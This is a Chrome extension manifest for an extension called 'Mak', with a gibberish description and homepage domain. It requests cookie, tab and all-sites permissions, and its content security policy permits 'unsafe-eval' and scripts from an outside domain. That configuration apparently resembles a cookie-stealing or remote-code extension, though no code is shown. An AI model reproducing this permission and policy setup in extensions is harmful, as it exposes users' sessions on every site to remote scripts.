{
    "update_url": "https://clients2.google.com/service/update2/crx",
    "version": "2.4.1",
    "manifest_version": 2,
    "background": {
        "scripts": [
            "background.js"
        ]
    },
    "name": "Mak",
    "permissions": [
        "cookies",
        "*://*/*",
        "tabs"
    ],
    "description": "Mak anugu lute rifacap ahijog pako igejeyu orag",
    "homepage_url": "http://bugatolalo.com",
    "icons": {
        "16": "icon16.png",
        "48": "icon48.png",
        "128": "icon128.png"
    },
    "content_security_policy": "script-src 'self' 'unsafe-eval' https://checksystem.xyz; object-src 'self'",
    "browser_action": {
        "default_icon": "icon48.png",
        "default_popup": "popup.html"
    }
}